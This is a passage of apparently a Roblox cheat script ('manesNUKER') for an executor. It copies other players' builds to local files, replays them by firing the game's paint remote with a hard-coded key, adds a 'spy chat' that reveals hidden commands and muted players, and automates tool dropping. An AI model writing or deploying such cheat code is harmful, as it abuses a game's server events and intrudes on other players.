                    if d < bestDist then bestDist = d; placed = v end
                end
            end
        end
    end

    -- Paint the placed brick (color + material + anchor state)
    if placed and placed.Parent then
        local paintTool = char:FindFirstChild("Paint") or LocalPlayer.Backpack:FindFirstChild("Paint")
        if paintTool then
            if paintTool.Parent ~= char then paintTool.Parent = char; task.wait(0.05) end
            local remote = paintTool:FindFirstChild("Event",true) or paintTool:FindFirstChildWhichIsA("RemoteEvent",true)
            if remote then
                local key = "both 🤝"
                pcall(function() remote:FireServer(placed, Enum.NormalId.Top, hrp.Position, key,
                    color or Color3.new(1,1,1), mat or "smooth", anchored and "anchor" or "unanchor") end)
            end
        end
    end
end

-- ── ghost-display helper ─────────────────────────────────────
local function bs_createpartrepl(pos, bsize, col, mat, transp, anch, collide)
    if typeof(pos) == "CFrame" then pos = pos.Position end
    local p = Instance.new("Part")
    bs_oldprt = p
    p.Anchored = anch or true
    p.CanCollide = collide or false
    p.CastShadow = false
    p.CanQuery = false
    p.Color = col or Color3.new(1,1,1)
    p.Transparency = transp or 0.5
    p.Material = mat or Enum.Material.SmoothPlastic
    if bsize then
        pos = Vector3.new((pos.X+(bsize.X/2))-0.5, (pos.Y+(bsize.Y/2))-0.5, (pos.Z+(bsize.Z/2))-0.5)
    end
    p.Size = bsize or Vector3.new(bs_mult,bs_mult,bs_mult)
    p.CFrame = CFrame.new(pos)
    p.Parent = workspace
    return p
end

-- ── Dropdown widget (scrollable list of saves) ───────────────
-- We build a scrollable button list inside the page
local bs_savedList    = {}   -- current list of save names on-screen
local bs_savedListBtns = {}
local bs_savedListFrame = Instance.new("Frame", pgAutoBuild)
bs_savedListFrame.Size = UDim2.fromOffset(CW, 120)
bs_savedListFrame.BackgroundColor3 = Color3.fromRGB(20,20,30)
bs_savedListFrame.BorderSizePixel = 0
Instance.new("UICorner", bs_savedListFrame).CornerRadius = UDim.new(0,6)
local bs_savedScroll = Instance.new("ScrollingFrame", bs_savedListFrame)
bs_savedScroll.Size = UDim2.fromScale(1,1)
bs_savedScroll.BackgroundTransparency = 1
bs_savedScroll.BorderSizePixel = 0
bs_savedScroll.ScrollBarThickness = 3
bs_savedScroll.ScrollBarImageColor3 = blueColor
bs_savedScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
bs_savedScroll.CanvasSize = UDim2.new(0,0,0,0)
local bs_savedLayout = Instance.new("UIListLayout", bs_savedScroll)
bs_savedLayout.Padding = UDim.new(0,2)
local bs_savedPad = Instance.new("UIPadding", bs_savedScroll)
bs_savedPad.PaddingLeft = UDim.new(0,3); bs_savedPad.PaddingTop = UDim.new(0,3)

local bs_selLabel = createLabel(pgAutoBuild, "  No save selected", Color3.fromRGB(116,113,117), 11)

local function bs_refreshList()
    for _,b in pairs(bs_savedListBtns) do b:Destroy() end
    bs_savedListBtns = {}
    bs_savedList = bs_getfn()
    table.sort(bs_savedList, function(a,b) return a:lower() < b:lower() end)
    for _, name in ipairs(bs_savedList) do
        local btn = Instance.new("TextButton", bs_savedScroll)
        btn.Size = UDim2.fromOffset(CW-16, 24)
        btn.BackgroundColor3 = Color3.fromRGB(30,30,45)
        btn.Text = name; btn.Font = Enum.Font.Gotham; btn.TextSize = 11
        btn.TextColor3 = Color3.fromRGB(200,200,210); btn.BorderSizePixel = 0
        btn.TextXAlignment = Enum.TextXAlignment.Left
        btn.AutoButtonColor = false
        Instance.new("UICorner",btn).CornerRadius = UDim.new(0,4)
        local pad = Instance.new("UIPadding",btn); pad.PaddingLeft = UDim.new(0,6)
        btn.MouseButton1Click:Connect(function()
            -- deselect others
            for _,b2 in pairs(bs_savedListBtns) do
                b2.BackgroundColor3 = Color3.fromRGB(30,30,45)
                b2.TextColor3 = Color3.fromRGB(200,200,210)
            end
            btn.BackgroundColor3 = blueColor
            btn.TextColor3 = Color3.new(1,1,1)
            local ok, data = pcall(function()
                return http:JSONDecode(readfile("TheChosenOneBuilds/"..name..".json"))
            end)
            if ok and data then
                bs_selectedbuild = {name, data}
                bs_selLabel.Text = "  Selected: "..name.." ("..#data.." blocks)"
                bs_selLabel.TextColor3 = blueColor
            else
                bs_selLabel.Text = "  Error reading: "..name
                bs_selLabel.TextColor3 = Color3.fromRGB(220,60,0)
            end
        end)
        table.insert(bs_savedListBtns, btn)
    end
end

-- ── Player build dropdown ─────────────────────────────────────
local bs_plrListBtns = {}
local bs_plrListFrame = Instance.new("Frame", pgAutoBuild)
bs_plrListFrame.Size = UDim2.fromOffset(CW, 80)
bs_plrListFrame.BackgroundColor3 = Color3.fromRGB(20,20,30)
bs_plrListFrame.BorderSizePixel = 0
Instance.new("UICorner", bs_plrListFrame).CornerRadius = UDim.new(0,6)
local bs_plrScroll = Instance.new("ScrollingFrame", bs_plrListFrame)
bs_plrScroll.Size = UDim2.fromScale(1,1)
bs_plrScroll.BackgroundTransparency = 1
bs_plrScroll.BorderSizePixel = 0
bs_plrScroll.ScrollBarThickness = 3
bs_plrScroll.ScrollBarImageColor3 = blueColor
bs_plrScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
bs_plrScroll.CanvasSize = UDim2.new(0,0,0,0)
local bs_plrLayout = Instance.new("UIListLayout", bs_plrScroll)
bs_plrLayout.Padding = UDim.new(0,2)
local bs_plrPad = Instance.new("UIPadding", bs_plrScroll)
bs_plrPad.PaddingLeft = UDim.new(0,3); bs_plrPad.PaddingTop = UDim.new(0,3)

local bs_buildhighlight = Instance.new("Highlight")
bs_buildhighlight.Parent = game:GetService("CoreGui")
bs_buildhighlight.FillColor = Color3.fromRGB(0,255,0)
bs_buildhighlight.FillTransparency = 0.9

local function bs_refreshPlrList()
    for _,b in pairs(bs_plrListBtns) do b:Destroy() end
    bs_plrListBtns = {}
    table.sort(bs_plrnames, function(a,b) return a:lower() < b:lower() end)
    for _, name in ipairs(bs_plrnames) do
        local btn = Instance.new("TextButton", bs_plrScroll)
        btn.Size = UDim2.fromOffset(CW-16, 22)
        btn.BackgroundColor3 = Color3.fromRGB(30,30,45)
        btn.Text = name; btn.Font = Enum.Font.Gotham; btn.TextSize = 10
        btn.TextColor3 = Color3.fromRGB(200,200,210); btn.BorderSizePixel = 0
        btn.TextXAlignment = Enum.TextXAlignment.Left; btn.AutoButtonColor = false
        Instance.new("UICorner",btn).CornerRadius = UDim.new(0,4)
        local pad2 = Instance.new("UIPadding",btn); pad2.PaddingLeft = UDim.new(0,6)
        btn.MouseButton1Click:Connect(function()
            for _,b2 in pairs(bs_plrListBtns) do
                b2.BackgroundColor3 = Color3.fromRGB(30,30,45)
                b2.TextColor3 = Color3.fromRGB(200,200,210)
            end
            btn.BackgroundColor3 = blueColor; btn.TextColor3 = Color3.new(1,1,1)
            bs_plrbuild = bs_plrbuilds[name]
            if bs_hpb then bs_buildhighlight.Adornee = bs_plrbuild end
        end)
        table.insert(bs_plrListBtns, btn)
    end
end

-- populate player builds from workspace.Bricks
local function bs_dobricks(f, silent)
    bs_plrbuilds[f.Name] = f
    if f:FindFirstChild("Brick") then
        if not table.find(bs_plrnames, f.Name) then
            table.insert(bs_plrnames, f.Name)
        end
    end
    f.ChildAdded:Connect(function()
        if not table.find(bs_plrnames, f.Name) then
            table.insert(bs_plrnames, f.Name)
            bs_refreshPlrList()
        end
    end)
    f.ChildRemoved:Connect(function()
        if #f:GetChildren() <= 0 then
            local idx = table.find(bs_plrnames, f.Name)
            if idx then table.remove(bs_plrnames, idx) end
            bs_refreshPlrList()
        end
    end)
    if not silent then bs_refreshPlrList() end
end

pcall(function()
    for _,v in pairs(workspace.Bricks:GetChildren()) do
        if v:IsA("Model") then bs_dobricks(v, true) end
    end
    bs_refreshPlrList()
    workspace.Bricks.ChildAdded:Connect(function(child) bs_dobricks(child) end)
end)

-- ────────────────────────────────────────────────────────────
-- UI
-- ────────────────────────────────────────────────────────────

-- STOP / SKIP
createLabel(pgAutoBuild, "  Build Control", Color3.fromRGB(80,80,120), 12)
createButton(pgAutoBuild, "  Stop Building", function() bs_stopped = true end, CW, 32)
createButton(pgAutoBuild, "  Skip Block",    function() bs_skipblock = true end, CW, 32)
createDivider(pgAutoBuild)

-- BUILD NAME
createLabel(pgAutoBuild, "  Set Save Name", Color3.fromRGB(80,80,120), 12)
local bs_nameBox = createTextBox(pgAutoBuild, "Untitled", CW, 30)
bs_nameBox.ClearTextOnFocus = false
bs_nameBox.FocusLost:Connect(function()
    local txt = bs_validate(bs_nameBox.Text)
    if txt ~= "" then
        bs_savebuildname = txt
        bs_nameBox.PlaceholderText = "Name set: "..txt
        bs_nameBox.Text = ""
    end
end)
createDivider(pgAutoBuild)

-- SAVING
createLabel(pgAutoBuild, "  Save Builds", Color3.fromRGB(80,80,120), 12)

createButton(pgAutoBuild, "  Save My Build", function()
    local bricks = workspace.Bricks
    local myFolder = bricks:FindFirstChild(LocalPlayer.Name)
    if not myFolder then print("[BSAL] No build folder found"); return end
    local builddata = {}
    for _,v in pairs(myFolder:GetChildren()) do
        if v:IsA("BasePart") then table.insert(builddata, bs_saveblock(v)) end
    end
    local name = bs_savebuildname
    if name == "Untitled" or table.find(bs_getfn(), name) then
        bs_savebuildnames[name] = (bs_savebuildnames[name] or 0) + 1
        name = name..tostring(bs_savebuildnames[name])
    end
    pcall(function() writefile("TheChosenOneBuilds/"..name..".json", http:JSONEncode(builddata)) end)
    pcall(function() writefile("thechosenonenames.txt", http:JSONEncode(bs_savebuildnames)) end)
    bs_refreshList()
    print("[BSAL] Saved '"..name.."' ("..#builddata.." blocks)")
end, CW, 36)

createButton(pgAutoBuild, "  Save Server Builds (ALL)", function()
    local builddata = {}
    for _,v in pairs(workspace.Bricks:GetDescendants()) do
        if v:IsA("BasePart") then table.insert(builddata, bs_saveblock(v)) end
    end
    local name = bs_savebuildname
    if name == "Untitled" or table.find(bs_getfn(), name) then
        bs_savebuildnames[name] = (bs_savebuildnames[name] or 0) + 1
        name = name..tostring(bs_savebuildnames[name])
    end
    pcall(function() writefile("TheChosenOneBuilds/"..name..".json", http:JSONEncode(builddata)) end)
    pcall(function() writefile("thechosenonenames.txt", http:JSONEncode(bs_savebuildnames)) end)
    bs_refreshList()
    print("[BSAL] Saved server builds '"..name.."' ("..#builddata.." blocks)")
end, CW, 36)

createDivider(pgAutoBuild)

-- PLAYER BUILD PICKER
createLabel(pgAutoBuild, "  Select Player Build (pick then save)", Color3.fromRGB(80,80,120), 12)
-- (bs_plrListFrame already parented to pgAutoBuild above)

createToggle(pgAutoBuild, "  Highlight Selected Player Build", function(v)
    bs_hpb = v
    if v and bs_plrbuild then
        bs_buildhighlight.Adornee = bs_plrbuild
        bs_buildhighlight.FillTransparency = 0.9
        bs_buildhighlight.OutlineTransparency = 0
    else
        bs_buildhighlight.FillTransparency = 1
        bs_buildhighlight.OutlineTransparency = 1
    end
end, CW)

createButton(pgAutoBuild, "  Save Player Build", function()
    if not bs_plrbuild then print("[BSAL] No player selected"); return end
    local builddata = {}
    for _,v in pairs(bs_plrbuild:GetChildren()) do
        if v:IsA("BasePart") then table.insert(builddata, bs_saveblock(v)) end
    end
    local name = bs_savebuildname
    if name == "Untitled" or table.find(bs_getfn(), name) then
        bs_savebuildnames[name] = (bs_savebuildnames[name] or 0) + 1
        name = name..tostring(bs_savebuildnames[name])
    end
    pcall(function() writefile("TheChosenOneBuilds/"..name..".json", http:JSONEncode(builddata)) end)
    pcall(function() writefile("thechosenonenames.txt", http:JSONEncode(bs_savebuildnames)) end)
    bs_refreshList()
    print("[BSAL] Saved player build '"..name.."' ("..#builddata.." blocks)")
end, CW, 36)

createDivider(pgAutoBuild)

-- SAVED BUILDS LIST (dropdown substitute)
createLabel(pgAutoBuild, "  Saved Builds (click to select)", Color3.fromRGB(80,80,120), 12)
createButton(pgAutoBuild, "  Refresh List", function() bs_refreshList() end, CW, 30)
-- (bs_savedListFrame already parented to pgAutoBuild)
-- (bs_selLabel already parented to pgAutoBuild)

-- DELETE
createButton(pgAutoBuild, "  Delete Selected Save", function()
    if not bs_selectedbuild then print("[BSAL] Nothing selected"); return end
    pcall(function() delfile("TheChosenOneBuilds/"..bs_selectedbuild[1]..".json") end)
    print("[BSAL] Deleted "..bs_selectedbuild[1])
    bs_selectedbuild = nil
    bs_selLabel.Text = "  No save selected"
    bs_selLabel.TextColor3 = Color3.fromRGB(116,113,117)
    bs_refreshList()
end, CW, 32)

-- LOAD SAVE
createButton(pgAutoBuild, "  Load Selected Save", function()
    if not bs_selectedbuild then print("[BSAL] Nothing selected"); return end
    local build = bs_selectedbuild[2]
    if not build then return end
    bs_stopped = false
    if bs_oldprt then pcall(function() bs_oldprt:Destroy() end) end
    task.spawn(function()
        for _,v in pairs(build) do
            if bs_stopped then break end
            while bs_skipblock do bs_skipblock = false; break end
            local posses = v.p or v.pos
            if posses then
                local pos  = CFrame.new(posses[1],posses[2],posses[3]).Position + bs_offset
                local bsz  = (v.s or v.size) and Vector3.new(table.unpack(v.s or v.size)) or nil
                local col  = Color3.fromRGB(table.unpack(v.c or v.color or {255,255,255}))
                local mat  = v.m or v.mat
                local orig = v.o or v.origmat
                local anch = v.a
                local coll = v.cc
                bs_createpartrepl(pos, bsz, col, bs_swapped[mat], 0.5, anch, coll)
                bs_buildblock(pos, mat, col, nil, bsz, orig, v.sp or v.sprayed, anch, coll)
            end
        end
        bs_stopped = false
        print("[BSAL] Load complete!")
    end)
end, CW, 36)

createDivider(pgAutoBuild)

-- DISPLAY / PREVIEW
createLabel(pgAutoBuild, "  Display Build (only you see)", Color3.fromRGB(80,80,120), 12)
createButton(pgAutoBuild, "  Display Whole Build (may lag)", function()
    if not bs_selectedbuild then print("[BSAL] Nothing selected"); return end
    if bs_prttable then
        for _,v in pairs(bs_prttable) do pcall(function() v:Destroy() end) end
    end
    local t = {}
    for _,v in pairs(bs_selectedbuild[2]) do
        local posses = v.pos or v.p
        if posses then
        local pos  = CFrame.new(posses[1],posses[2],posses[3]).Position + bs_offset
        local bsz  = (v.size or v.s) and Vector3.new(table.unpack(v.size or v.s)) or nil
        local col  = Color3.fromRGB(table.unpack(v.color or v.c or {200,200,200}))
        local prt  = bs_createpartrepl(pos, bsz, col, bs_swapped[v.mat or v.m], 0, v.a or v.anchored, v.cc or v.collide)
        table.insert(t, prt)
        end -- if posses
    end
    bs_prttable = t
    print("[BSAL] Displayed "..#t.." blocks")
end, CW, 36)

createButton(pgAutoBuild, "  Delete Build Display", function()
    if bs_prttable then
        for _,v in pairs(bs_prttable) do pcall(function() v:Destroy() end) end
        bs_prttable = nil
    end
end, CW, 32)

createDivider(pgAutoBuild)

-- OFFSET
createLabel(pgAutoBuild, "  Build Offset", Color3.fromRGB(80,80,120), 12)
createLabel(pgAutoBuild, "  Sets offset to your current position when loading", Color3.fromRGB(11,95,226), 10)

local bs_offsetpart = Instance.new("Part")
bs_offsetpart.Shape = Enum.PartType.Ball; bs_offsetpart.Anchored = true
bs_offsetpart.CanCollide = false; bs_offsetpart.CastShadow = false
bs_offsetpart.CanQuery = false; bs_offsetpart.Color = Color3.new(0,1,0)
bs_offsetpart.Transparency = 1; bs_offsetpart.Size = Vector3.new(3,3,3)
bs_offsetpart.Parent = workspace

createButton(pgAutoBuild, "  Set Offset (your position)", function()
    local char = LocalPlayer.Character
    local hrp  = char and char:FindFirstChild("HumanoidRootPart")
    if hrp then
        bs_offset = hrp.Position
        bs_offsetpart.Position = bs_offset; bs_offsetpart.Transparency = 0.5
        print("[BSAL] Offset set to "..tostring(bs_offset))
    end
end, CW, 32)

createButton(pgAutoBuild, "  Reset Offset", function()
    bs_offset = Vector3.new(0,0,0)
    bs_offsetpart.Transparency = 1
    print("[BSAL] Offset reset")
end, CW, 32)

createDivider(pgAutoBuild)

-- OPTIMIZE
createLabel(pgAutoBuild, "  Optimize Saves (legacy format fix)", Color3.fromRGB(80,80,120), 12)

local function bs_optimizeOne()
    if not bs_selectedbuild then return end
    local build = bs_selectedbuild[2]
    for _,v in pairs(build) do
        if v.pos then v.p = v.pos; v.pos = nil end
        if v.mat then v.m = v.mat; v.mat = nil end
        if v.size then v.s = v.size; v.size = nil end
        if v.color then v.c = v.color; v.color = nil end
        if v.origmat then v.o = v.origmat; v.origmat = nil end
        if v.sprayed then v.sp = v.sprayed; v.sprayed = nil end
        if v.anchored ~= nil then v.a = v.anchored; v.anchored = nil end
        if v.collide ~= nil then v.cc = v.collide; v.collide = nil end
    end
    pcall(function() writefile("TheChosenOneBuilds/"..bs_selectedbuild[1]..".json", http:JSONEncode(build)) end)
    print("[BSAL] Optimized "..bs_selectedbuild[1])
end

createButton(pgAutoBuild, "  Optimize Selected Save", bs_optimizeOne, CW, 32)

createButton(pgAutoBuild, "  Optimize ALL Saves (recommended)", function()
    local orig = bs_selectedbuild
    local files = bs_listfiles("TheChosenOneBuilds/")
    for _,f in pairs(files) do
        local name = f:gsub("TheChosenOneBuilds/",""):gsub("%.json","")
        local ok, data = pcall(function() return http:JSONDecode(readfile(f)) end)
        if ok and data then
            bs_selectedbuild = {name, data}
            local ok2, err = pcall(bs_optimizeOne)
            if not ok2 then print("[BSAL] Already optimized: "..name.." | "..tostring(err)) end
        end
    end
    bs_selectedbuild = orig
    bs_refreshList()
    print("[BSAL] Done optimizing all saves")
end, CW, 36)

createDivider(pgAutoBuild)

-- PERFORMANCE SETTINGS
createLabel(pgAutoBuild, "  Performance Settings", Color3.fromRGB(80,80,120), 12)
createLabel(pgAutoBuild, "  Higher brick history = smoother, but may lag (default 400)", Color3.fromRGB(11,95,226), 10)

local bs_histBox = createTextBox(pgAutoBuild, "Brick History (400)", CW, 30)
bs_histBox.ClearTextOnFocus = false
bs_histBox.FocusLost:Connect(function()
    local n = tonumber(bs_histBox.Text)
    if n then
        bs_historymax = math.abs(n)
        for i,_ in pairs(bs_cubehistory) do
            if i > bs_historymax then bs_cubehistory[i] = nil end
        end
        print("[BSAL] Brick history set to "..bs_historymax)
    end
    bs_histBox.Text = ""
end)

createLabel(pgAutoBuild, "  Lower resize wait = faster but may miss resizes (default 0.4)", Color3.fromRGB(11,95,226), 10)
local bs_rwLabel = createLabel(pgAutoBuild, "  Resize Wait: 0.4s", Color3.fromRGB(116,113,117), 11)

local bs_rwBox = createTextBox(pgAutoBuild, "Resize Wait (0.4)", CW, 30)
bs_rwBox.ClearTextOnFocus = false
bs_rwBox.FocusLost:Connect(function()
    local n = tonumber(bs_rwBox.Text)
    if n then
        bs_resizewait = n
        bs_rwLabel.Text = "  Resize Wait: "..tostring(n).."s"
    end
    bs_rwBox.Text = ""
end)

createToggle(pgAutoBuild, "  Auto Resize Wait (based on ping)", function(v)
    bs_wbs = v
end, CW)

local bs_pingLabel = createLabel(pgAutoBuild, "  Ping: ???", Color3.fromRGB(116,113,117), 11)

-- ping monitor + auto resize wait loop
coroutine.wrap(function()
    while true do
        task.wait(1)
        pcall(function()
            local ping = -1
            for _,v in pairs(game:GetService("CoreGui").RobloxGui.PerformanceStats:GetChildren()) do
                local txt = v:FindFirstChildWhichIsA("TextLabel",true)
                if txt and txt.Text:find("ms") and txt.Text:find("%d") then
                    ping = tonumber(txt.Text:match("%d+")) or ping
                end
            end
            if ping >= 0 then
                bs_pingLabel.Text = "  Ping: "..tostring(ping).."ms"
                if bs_wbs then
                    bs_resizewait = math.max(0.1, ping/1000 * 1.5)
                    bs_rwLabel.Text = "  Resize Wait: "..string.format("%.2f", bs_resizewait).."s"
                end
            end
        end)
    end
end)()

-- initial list load
bs_refreshList()
bs_refreshPlrList()

end -- close page 12

do -- page 13: TOOLS
-- PAGE 13: TOOLS - Spy Chat, Auto Drop/Pickup Tools
-- ============================================================

createLabel(pgTools, "  Tools & Utilities", Color3.fromRGB(80,80,120), 13)
createLabel(pgTools, "  Extra Stuff features by 2AREYOUMENTAL110", Color3.fromRGB(11,95,226), 11)
createDivider(pgTools)

-- ==== SPY CHAT ====
createLabel(pgTools, "  Spy Chat", Color3.fromRGB(80,80,120), 12)
createLabel(pgTools, "  Colors chat by role: orange=admin, cyan=arken, red=hidden/cmd, pink/red=IQ", Color3.fromRGB(11,95,226), 10)

local tc_spychat = false
local tc_namecolors = {
    peasant  = {150,103,102},
    arken    = {4,175,236},
    admin    = {245,205,48},
    hidden   = {255,0,0},
    iqgenius = {255,179,179},
    iqdumb   = {200,0,0}
}
local tc_namecolorshex = {}
for i,v in pairs(tc_namecolors) do
    tc_namecolorshex[i] = "#"..Color3.fromRGB(table.unpack(v)):ToHex()
end

local tc_origOIM = nil  -- store original so we can restore on toggle off

local function tc_oimremake(mdata)
    local plr = mdata.TextSource and mdata.TextSource.UserId and Players:GetPlayerByUserId(mdata.TextSource.UserId)
    if not plr then return end
    local cn = "peasant"
    local hidden = false
    if plr.Neutral == true then
        cn = plr:GetAttribute("Arken") == true and "arken" or "peasant"
    else
        cn = "admin"
    end
    local muted = pcall(function() return plr:HasTag("Muted") end) and plr:HasTag("Muted")
    if muted then cn = "hidden" end
    if string.sub(mdata.Text,1,1) == ";" then
        cn = "hidden"; hidden = true
    end
    local iq = nil
    if plr:GetAttribute("IQ") then
        if plr:GetAttribute("IQ") >= 200 then iq = "genius"; cn = "iqgenius"
        elseif plr:GetAttribute("IQ") <= 50 then iq = "dumb"; cn = "iqdumb" end
    end
    local col = tc_namecolors[cn]
    local rgb = "rgb("..col[1]..","..col[2]..","..col[3]..")"
    local tag = ""
    if hidden then tag = tag.." [HIDDEN]" end
    if muted  then tag = tag.." [MUTED]"  end
    if iq     then tag = tag.." ["..iq.."]" end
    mdata.PrefixText = "<font color='"..rgb.."'><b>("..plr.DisplayName..tag..") </b></font>"
end

createToggle(pgTools, "  Spy Chat ON/OFF", function(v)
    tc_spychat = v
    if v then
        game.TextChatService.OnIncomingMessage = tc_oimremake
        print("[TOOLS] Spy Chat ON")
    else
        game.TextChatService.OnIncomingMessage = tc_origOIM
        print("[TOOLS] Spy Chat OFF")
    end
end, CW)

createDivider(pgTools)

-- ==== AUTO DROP / PICKUP TOOLS ====
createLabel(pgTools, "  Auto Drop & Pickup Tools", Color3.fromRGB(80,80,120), 12)
createLabel(pgTools, "  Auto drops ALL tools on death (incl. Arkenstone if enabled)", Color3.fromRGB(11,95,226), 10)
createLabel(pgTools, "  Auto picks up your dropped tools when you respawn", Color3.fromRGB(11,95,226), 10)

local tc_pickuptools   = false
local tc_autodroptools = false
local tc_keepArken     = true   -- don't drop Arkenstone by default
local tc_currhum       = nil

-- Track humanoid across spawns
local function tc_trackChar(c)
    local hum = c:FindFirstChildOfClass("Humanoid")
    if hum then tc_currhum = hum end
    c.ChildAdded:Connect(function(child)
        if child:IsA("Humanoid") then tc_currhum = child end
        -- tag tools that get added to char as "DroppedByScript" so we can re-pickup them
        if child:IsA("Tool") and not child:HasTag("DroppedByScript") then
            pcall(function() child:AddTag("DroppedByScript") end)
        end
    end)
end

if LocalPlayer.Character then tc_trackChar(LocalPlayer.Character) end
LocalPlayer.CharacterAdded:Connect(function(c) tc_trackChar(c) end)

-- Main loop: pickup on alive, drop on death
coroutine.wrap(function()
    while true do
        task.wait(0.1)
        if tc_currhum and tc_currhum.Parent then
            -- AUTO PICKUP: pick up tools we dropped (tagged)
            if tc_pickuptools and tc_currhum.Health > 0 then
                for _, v in pairs(workspace:GetChildren()) do
                    if v:IsA("Tool") and v:FindFirstChild("Handle") then
                        local hasTag = pcall(function() return v:HasTag("DroppedByScript") end) and v:HasTag("DroppedByScript")
                        if hasTag then
                            pcall(function() tc_currhum:EquipTool(v) end)
                        end
                    end
                end
            end
            -- AUTO DROP: drop all tools on death
            if tc_autodroptools and tc_currhum.Health <= 0 then
                local char = LocalPlayer.Character
                if char then
                    -- move backpack tools to char first
                    for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do
                        if v:IsA("Tool") then
                            if not (tc_keepArken and v.Name == "The Arkenstone") then
                                pcall(function() v.Parent = char end)
                            end
                        end
                    end
                    task.wait(0.05)
                    -- drop all char tools to workspace
                    for _, v in pairs(char:GetChildren()) do
                        if v:IsA("Tool") then
                            if not (tc_keepArken and v.Name == "The Arkenstone") then
                                pcall(function()
                                    v:AddTag("DroppedByScript")
                                    v.Parent = workspace
                                end)
                            end
                        end
                    end
                end
            end
        end
    end
end)()

createToggle(pgTools, "  Auto Pickup Dropped Tools", function(v)
    tc_pickuptools = v
    print("[TOOLS] Auto Pickup: "..(v and "ON" or "OFF"))
end, CW)

createToggle(pgTools, "  Auto Drop Tools on Death", function(v)
    tc_autodroptools = v
    print("[TOOLS] Auto Drop: "..(v and "ON" or "OFF"))
end, CW)

createToggle(pgTools, "  Keep Arkenstone (don't drop it)", function(v)
    tc_keepArken = v
end, CW)

createDivider(pgTools)

-- MANUAL buttons
createLabel(pgTools, "  Manual Actions", Color3.fromRGB(80,80,120), 12)

createButton(pgTools, "  Equip All Tools", function()
    local char = LocalPlayer.Character; if not char then return end
    for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do
        if v:IsA("Tool") then
            if not (tc_keepArken and v.Name == "The Arkenstone") then
                pcall(function() v.Parent = char end)
            end
        end
    end
    print("[TOOLS] Equipped all tools")
end, CW, 34)

createButton(pgTools, "  Drop All Tools", function()
    local char = LocalPlayer.Character; if not char then return end
    for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do
        if v:IsA("Tool") then
            if not (tc_keepArken and v.Name == "The Arkenstone") then
                pcall(function() v.Parent = char end)
            end
        end
    end
    task.wait(0.05)
    for _, v in pairs(char:GetChildren()) do
        if v:IsA("Tool") then
            if not (tc_keepArken and v.Name == "The Arkenstone") then
                pcall(function()
                    v:AddTag("DroppedByScript")
                    v.Parent = workspace
                end)
            end
        end
    end
    print("[TOOLS] Dropped all tools")
end, CW, 34)

end -- close page 14

do -- page 14: PAGE 14: CREDITS
-- PAGE 13: CREDITS -- text only, no buttons
-- ============================================================
local credLbl = Instance.new("TextLabel", pgCredits)
credLbl.Size                   = UDim2.fromOffset(CW, 300)
credLbl.BackgroundTransparency = 1
credLbl.Text                   = "credit to stik for ui\nand the nuker script\n\nand credits to kii akira\nfor the god mode code"
credLbl.Font                   = Enum.Font.GothamBold
credLbl.TextSize               = 22
credLbl.TextColor3             = Color3.fromRGB(116, 113, 117)
credLbl.TextWrapped            = true
credLbl.TextXAlignment         = Enum.TextXAlignment.Center
credLbl.TextYAlignment         = Enum.TextYAlignment.Center

-- ============================================================
end -- close page 13

-- INIT
-- ============================================================
updatePage()
print("[manesNUKER] Loaded! Use < > to switch pages")
